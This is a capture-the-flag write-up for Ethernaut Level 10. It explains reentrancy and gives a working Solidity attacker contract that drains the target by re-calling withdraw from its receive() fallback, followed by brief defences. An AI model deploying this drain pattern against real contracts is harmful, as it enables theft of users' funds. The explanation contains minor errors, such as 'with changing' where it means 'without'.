
# Ethernaut Level 10 Reentrancy
- This level is Reentracy Problem, where we need to drain the balance of the contract.
- For solving this challenge, we need to understand reentrancy in solidity which is classic problem which first occured in DAO hack
- Reentrancy happens only when external call is made with changing the internal state, then attacker can call the function infinitely to opt out the balance before the state updation.

# Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Reentrance {
    function donate(address _to) external payable;

    function withdraw(uint256 _amount) external;

    function balanceOf(address _who) external view returns (uint256);
}

contract ReentranceAttacker {
    Reentrance private reentrance;
    address owner;

    constructor(address payable _reentrance) {
        reentrance = Reentrance(_reentrance);
        owner = msg.sender;
    }

    function attack() public payable {
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(msg.value);
    }

    receive() external payable {
        reentrance.withdraw(msg.value);
    }

    function withdraw() public {
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success);
    }
}
 
```
# Preventive Measures
-  Use reentrance guard from openzeppelin whenever external calls are made.
- Use Checks-Effects-Interactions pattern,
is used for mitigating reentrancy attacks.
 



